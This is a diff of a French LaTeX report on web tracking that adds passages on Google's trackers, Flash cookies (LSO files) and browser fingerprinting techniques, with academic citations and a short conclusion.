+Avec le nombre élevé de sites utilisant les services de Google, ce dernier a les moyens de dresser une carte d'Internet. Il est même en mesure de connaître la plupart des sites visités de l'utilisateur (à la condition qu'ils intègrent un tracker de Google). Cela va sans dire que Google détient une très grande quantité d'informations sur les utilisateurs du Web actuel quand on y ajoute les messages privés (Gmail), la localisation (Android) et les nombreux autres services du groupe.
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \section{Flash}
@@ -279,7 +351,7 @@ Flash peut être utilisé dans le tracking des utilisateurs car il utilise son p
   \item ils sont stockés dans un emplacement différent, ce qui implique que la plupart des utilisateurs ne savent pas les effacer facilement et qu'ils sont accessibles via différents navigateurs
   \item ils ne sont pas contrôlés par le navigateur et celui-ci ne peut donc pas les effacer
   \item ils permettent de stocker des types de données simples (String, Array et Date)
-  \newline
+  %\newline
 \end{itemize}
 
 Ces caractéristiques font que les cookies Flash (ce sont des fichiers avec l'extension \textit{.sol}) sont plus persistants et méconnus des utilisateurs. Pour supprimer les cookies Flash sans connaître leur emplacement, il faut se rendre sur une page dédiée \footnote{\url{http://www.macromedia.com/support/documentation/en/flashplayer/help/settings_manager07.html}} du site d'Adobe \footnote{Adobe est le développeur de Flash Player.}.
@@ -297,6 +369,12 @@ Avec le contenu du répertoire \textit{macromedia.com}, on peut constater un aut
 
 Notez que le navigateur Google Chrome n'utilise pas ce répertoire car Flash est intégré au navigateur \cite{flash_chrome}. Il est donc possible de supprimer les cookies Flash dans les paramètres du navigateur ou en se rendant sur la page dédiée du site Adobe.
 \newline
+
+\begin{figure}[h]
+	\centering
+	\lstinputlisting[style=dig]{examples/ls_macromedia.com}
+	\caption{\label{ls_macromedia.com}Affichage des dossiers dans \textit{macromedia.com}}.
+\end{figure}
 
 Dans une expérience réalisée en 2009 \cite{conf/aaaiss/SoltaniCMTH10}, il a été montré que dans le TOP 100 des sites (classement Quantcast - juillet 2009), 54 sites ont utilisé des cookies Flash. Ces 54 sites ont généré 157 fichiers LSO pour arriver à un total de 281 cookies individuels. 98\% de ces sites ont également créé des cookies HTTP (seuls \textit{wikipedia.org} et \textit{wikimedia.org} ne l'ont pas fait) pour un total de 3602 cookies HTTP.
 
@@ -318,18 +396,32 @@ Il faut noter qu'Adobe a condamné l'utilisation des LSO à des fins de tracking
 
 Avant la version 10.1 de Flash Player \cite{flash_private}, celui-ci ne prenait pas en compte les effets des sessions de navigation privée des navigateurs. Cela signifie que lorsqu'un utilisateur activait une session de navigation privée avec son navigateur, les cookies, fichiers en cache et l'historique de sa session étaient supprimés par le navigateur mais ce n'était pas le cas pour les cookies Flash. Depuis la version 10.1 de Flash Player, celui-ci garde les fichiers LSO de la navigation privée en mémoire sans les enregistrer sur le disque et n'accède pas non plus aux LSO existants. A la fin de la session de navigation privée, Flash Player efface les données en conformité avec les préférences du navigateur.
 
-
-\begin{figure}[h]
-	\centering
-	\lstinputlisting[style=dig]{examples/ls_macromedia.com}
-	\caption{\label{ls_macromedia.com}Affichage des dossiers dans \textit{macromedia.com}}.
-\end{figure}
-
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \section{Empreintes des navigateurs}
 \label{fingerprinters}
+Jusqu'à présent, nous avons vu des techniques de tracking dites avec état (stateful tracking). A l'opposé, il existe des techniques dites sans état (stateless tracking) utilisant des \textit{fingerprinters\footnote{En français, on pourrait traduire ce mot par "calculateur d'empreinte".}} \cite{Mayer:2012:TWT:2310656.2310703}. Ces derniers récupèrent une série d'informations qu'ils agrègent afin d'associer un identifiant (presqu') unique à l'utilisateur. Le principal avantage de cette méthode est que les informations ne dépendent que très peu de l'utilisateur.
+En effet, avec des techniques utilisant des cookies, le tracking peut être rendu complexe par la suppression des cookies par l'utilisateur. A l'inverse, avec les fingerprinters, les informations récupérées sont relativement stables grâce à leur nature (numéro de version du navigateur, système d'exploitation, la résolution d'écran, etc).
+\newline
 
+Le \textit{fingerprinter} regroupe les informations qui lui sont nécessaires via différentes sources \cite{Nikiforakis:2013:CME:2497621.2498133}. La première source est constituée des plugins populaires tels que Flash. Par exemple, lorsqu'on demande au navigateur la plateforme d'exécution sur une version 64 bits de Linux, il répond "Linux x86\_64" alors que si on demande la même information à Flash, il répond en indiquant la version complète du noyau Linux. Il est également possible de déterminer si l'utilisateur utilise un second écran. En effet, avec l'implémentation Linux du plugin Flash, lorsque la résolution est demandée, Flash renvoie comme résolution d'écran la somme des écrans individuels alors que le navigateur renvoie la résolution de l'écran sur lequel la fenêtre est affichée.
 
+Les outils de fingerprinting s'adaptent également aux navigateurs des utilisateurs. Il a été montré qu'ils utilisent des propriétés spécifiques à certains navigateurs afin de récupérer certaines données. C'est notamment le cas avec Internet Explorer et les propriétés \textit{navigator.securityPolicy} et \textit{navigator.systemLanguage} \cite{Nikiforakis:2013:CME:2497621.2498133}.
+
+Une autre source importante d'informations vient des polices de caractères utilisées. Cette information n'est pas directement disponible via les navigateurs et les \textit{fingerprinters} n'hésitent pas à utiliser des plugins comme Flash pour récupérer cette liste. De plus, certains \textit{fingerprinters} incluent un "plan B" lorsque Flash n'est pas disponible. Ils mesurent la taille d'un phrase prédéfinie avec la police utilisée par défaut si la police demandée n'est pas disponible puis ils appliquent une police différente et mesurent la taille de la même phrase. Si la taille est identique, cela veut dire que la police n'est pas disponible chez l'utilisateur. Ils sont ainsi en mesure de déterminer une liste de polices installées chez l'utilisateur (avec l'inconvénient que les polices les plus rares ne sont pas détectées). Il faut noter que la présence de certaines polices rares permettent d'identifier un utilisateur avec une précision beaucoup plus importante \cite{Boda:2011:UTW:2341491.2341497}.
+
+Flash est également utilisé pour détecter les proxys HTTP. C'est d'ailleurs la raison pour laquelle il est désactivé dans des applications sensibles à l'anonymat.
+
+Une dernière source utilisée dans Internet Explorer provient des DLL chargées dans le navigateur. Certaines accèdent à des valeurs du registre Windows afin de transmettre des informations telles que les identifiants des disques durs, des paramètres TCP/IP, le nom de l'ordinateur, identifiant de produit d'Internet Explorer, la date d'installation de Windows, l'ID produit Windows Digital et les pilotes installés \cite{Nikiforakis:2013:CME:2497621.2498133}.
+\newline
+
+Au sein du tracking sans état, on peut distinguer deux types d'utilisation du \textit{fingerprinting} : le \textit{fingerprinting actif} qui acquiert les informations de manière active grâce à l'utilisation de scripts ou de plugins et le \textit{fingerprinting passif} qui acquiert les informations de manière passive grâce au trafic réseau (les requêtes et réponses HTTP).
+Le \textit{fingerprinting passif} est particulièrement problématique car il n'est pas détectable par le client. Un fingerprinter n'utilisant que du fingerprinting passif sera moins performant mais sera néanmoins en mesure de tracer certains types d'utilisateurs qui utilisent un navigateur qui est rarement modifié et peu mis à jour
+\newline
+
+Un aspect intéressant à analyser est la stabilité des empreintes des navigateurs. En effet, l'empreinte d'un navigateur peut être modifiée par différentes actions : mettre à jour le navigateur, mettre à jour un plugin, désactiver les cookies, installer une nouvelle police de caractères ou application qui contient des polices ou connecter un second moniteur (ce qui change la résolution d'écran). Il semblerait que les empreintes calculées ne soient pas particulièrement stables mais le fait que le navigateur dévoile tant d'informations rend cette technique de tracking très intéressante. \cite{Eckersley:2010:UYW:1881151.1881152}
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \section{Conclusion}
+Les moyens existants et mis en place dans le but de tracker les utilisateurs sont nombreux et divers. Certains restent relativement basiques alors que d'autres utilisent des techniques plus complexes. Certains sont conçus principalement dans le but d'effectuer un tracking sur un site particulier (les outils d'analyses de visites) alors que d'autres sont destinés à tracer les visiteurs sur de multiples sites (les régies publicitaires) afin de créer un profil des visiteurs.
+
+Il semble que les possibilités et moyens de tracker les utilisateurs naviguant sur Internet évoluent rapidement. De nouvelles techniques apparaissent alors que d'autres sont peu à peu oubliées.
